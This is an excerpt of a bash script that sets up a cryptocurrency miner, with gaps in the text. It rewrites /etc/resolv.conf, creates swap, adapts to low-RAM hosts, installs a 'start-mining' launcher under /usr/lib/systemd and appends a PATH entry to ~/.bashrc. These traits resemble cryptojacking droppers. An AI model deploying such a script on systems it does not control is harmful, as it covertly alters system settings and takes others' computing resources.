...
if [ "$EUID" -eq 0 ]; then
  ...
  IS_ROOT=0
  echo "[+] Mode: NON-ROOT (user: $USER)"
fi

echo "[+] Arch: $ARCH"

# Fix DNS if broken (root only)
if [ "$IS_ROOT" -eq 1 ]; then
  if ! nslookup github.com >/dev/null 2>&1; then
    echo "[+] Fixing DNS..."
    echo -e "nameserver 8.8.8.8\nnameserver 1.1.1.1" > /etc/resolv.conf 2>/dev/null
  fi
  ...
  echo "[i] Skipping DNS fix (no root access)"
  echo "[i] Skipping apt install (no root access)"
fi

# Setup paths based on user privilege
if [ "$IS_ROOT" -eq 1 ]; then
  DIR="/usr/lib/systemd"
  STARTER_DIR="/usr/local/bin"
else
  DIR="$HOME/.local/mining"
...
if [ "$TOTAL_RAM" -lt 1500 ]; then
  echo "[+] Very low RAM ($TOTAL_RAM MB)"
  # Create 2GB swap if none exists (root only)
  if [ "$IS_ROOT" -eq 1 ] && [ "$SWAP_SIZE" -lt 1024 ]; then
    echo "[+] Creating swap..."
    ...
    echo "[i] Cannot create swap (no root access)"
  fi
  RANDOMX_MODE="light"
  SCRATCHPAD=1
...
# Start script
STARTER="$STARTER_DIR/start-mining"
...
# Add to PATH if non-root
if [ "$IS_ROOT" -eq 0 ]; then
  if ! echo "$PATH" | grep -q "$STARTER_DIR"; then
    echo "export PATH=\"\$PATH:$STARTER_DIR\"" >> "$HOME/.bashrc" 2>/dev/null
    echo "[+] Added $STARTER_DIR to PATH"
  fi
fi
